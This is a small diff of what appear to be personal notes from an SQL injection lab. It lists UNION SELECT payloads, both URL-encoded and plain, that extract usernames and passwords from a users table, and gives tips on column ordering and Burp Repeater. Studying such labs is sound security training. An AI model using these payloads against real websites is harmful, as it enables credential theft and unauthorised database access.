@@ -19,7 +19,7 @@ We couldn't find out the database on this one. Well not simply by quering to fin
 We are presented with a page that is one column of data. 
 It is easy to skip steps when certain things don't work or you don't expect them. 
 Oracle:
-'+UNION+SELECT+NULL,username||'~'||password+FROM+users--;  Browser  Works from repeater which is after browser
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--;  Browser and Works from repeater which is after browser
 ' UNION SELECT NULL, username||'~'||password FROM users--; Browser   Only Browser. URL has to get encoded by browser.
 You had to know string was second column and not the first. Lesson always generate a good select not with NULL if you are grabbing data. 
 
